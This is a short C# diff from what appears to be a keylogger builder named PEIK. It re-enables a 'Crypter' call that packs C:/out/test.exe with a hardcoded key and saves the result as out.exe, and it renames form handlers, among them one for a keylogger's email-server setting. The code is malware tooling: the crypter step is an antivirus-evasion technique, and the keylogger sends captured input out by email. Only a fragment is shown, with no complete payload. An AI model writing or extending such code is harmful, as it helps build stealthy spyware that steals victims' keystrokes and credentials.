@@ -8,13 +8,12 @@ namespace PEIK
         public MainForm()
         {
             InitializeComponent();
-            Text += " v" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
-            /*Crypter c = new Crypter("C:/out/test.exe", Configuration.CryptoSRC, "contralol");
+            Crypter c = new Crypter("C:/out/test.exe", Configuration.CryptoSRC, "contralol");
             c.Process();
-            c.Save("C:/out/out.exe");*/
+            c.Save("C:/out/out.exe");
         }
 
-        private void comboBoxKeyloggerEmailServer_SelectedIndexChanged(object sender, System.EventArgs e)
+        private void ComboBoxKeyloggerEmailServerSelectedIndexChanged(object sender, System.EventArgs e)
         {
             switch (comboBoxKeyloggerEmailServer.SelectedIndex)
             {
@@ -46,7 +45,7 @@ namespace PEIK
             }
         }
 
-        private void exitToolStripMenuItem_Click(object sender, System.EventArgs e)
+        private void ExitToolStripMenuItemClick(object sender, System.EventArgs e)
         {
             Application.Exit();
         }
